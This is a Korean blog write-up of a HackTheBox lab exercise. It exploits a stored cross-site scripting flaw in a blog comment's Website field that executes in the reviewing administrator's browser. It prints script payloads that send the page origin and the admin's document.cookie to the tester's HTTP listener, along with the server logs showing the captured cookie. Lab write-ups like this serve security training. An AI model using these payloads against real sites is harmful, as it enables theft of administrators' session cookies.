---
title: "XSS - Skills Assessment"
date: 2026-07-07
layout: single
excerpt: "회사는 새롭게 공개한 Security Blog에 대한 웹 애플리케이션 침투 테스트를 의뢰하였다. 웹 애플리케이션 침투 테스트 계획을 진행하던 중, 해당 웹 애플리케이션에 Cross-Site Scripting(XSS) 취약점이 존재하는지 테스트해야 하는 단계에 도달하였다. 브라우저를 사용해 대상 서버의 /assessment 디렉터리에 접속한 후 테스트를 진행한다."
author_profile: true
toc: true
toc_label: "XSS"
toc_icon: "book"
toc_sticky: true
header:
  teaser: /assets/cpts-web/xss-skills-assessment/badge.png
  teaser_home_page: true
categories: [cpts-web]
tags: [web, cpts, xss]
---

# Scenario

회사는 새롭게 공개한 Security Blog에 대한 웹 애플리케이션 침투 테스트를 의뢰하였다.

웹 애플리케이션 침투 테스트 계획을 진행하던 중, 해당 웹 애플리케이션에 Cross-Site Scripting(XSS) 취약점이 존재하는지 테스트해야 하는 단계에 도달하였다.

브라우저를 사용해 대상 서버의 `/assessment` 디렉터리에 접속한 후 테스트를 진행한다.

## Web Enumeration

내부에는 다음과 같은 Security Blog 페이지가 존재한다:

![XSS](/assets/cpts-web/xss-skills-assessment/xss1.png)

게시글 제목을 클릭하면 다음과 같이 댓글을 작성할 수 있는 입력란이 나타난다:

![XSS](/assets/cpts-web/xss-skills-assessment/xss2.png)

각 입력란에 다음과 같은 테스트 값을 입력하였다:

```text
Comment : test
Name    : test
Email   : test.com
Website : http://10.10.15.3:8000/image.png
```

또한 요청이 발생하는지 확인하기 위해 로컬에서 Python HTTP 서버를 실행하였다:

```bash
$ python3 -m http.server 8000
```

댓글을 전송하자 다시 댓글 작성 화면으로 돌아왔지만, 실행해 둔 Python HTTP 서버에는 별도의 요청이 기록되지 않았다.

이는 댓글이 즉시 공개되는 것이 아니라, 관리자의 승인을 거친 후 게시되는 구조이기 때문일 가능성이 있다.

## XSS Discovery

`Website` 입력값이 관리자 페이지에 출력될 때 HTML 속성 내부에 삽입될 가능성을 고려하여, 작은따옴표와 닫는 꺾쇠를 사용해 기존 속성과 태그를 종료한 뒤 테스트 페이로드를 삽입하였다:

```html
http://10.10.15.3:8000/image.png'><script>new Image().src='http://10.10.15.3:8000/?c='+window.origin;</script>
```

댓글을 검토하는 관리자 브라우저에서 페이로드가 실행된 결과, 다음과 같이 현재 페이지의 Origin 값이 내 서버로 전달되었다:

```text
10.129.234.166 - - [07/Jul/2026 06:17:07] "GET /?c=http://127.0.0.1 HTTP/1.1" 200 -
```

이를 통해 댓글의 `Website` 입력값에 삽입한 JavaScript가 관리자의 브라우저에서 정상적으로 실행되는 것을 확인하였다.

## Cookie Exfiltration

확인한 XSS 취약점을 이용하여 관리자 브라우저에서 JavaScript로 접근할 수 있는 쿠키값을 외부 서버로 전송하였다.

다음 페이로드를 `Website` 입력란에 삽입하였다:

```html
http://10.10.15.3:8000/image.png'><script>new Image().src='http://10.10.15.3:8000/?c='+document.cookie;</script>
```

그 결과 다음과 같은 요청을 확인할 수 있었다:

```text
10.129.234.166 - - [07/Jul/2026 06:21:17] "GET /?c=wordpress_test_cookie=WP%20Cookie%20check;%20wp-settings-time-2=1784535681;%20flag=HTB{..SKIP..} HTTP/1.1" 200
```

이처럼 최종적으로 관리자 쿠키를 탈취하는 데 성공하였다.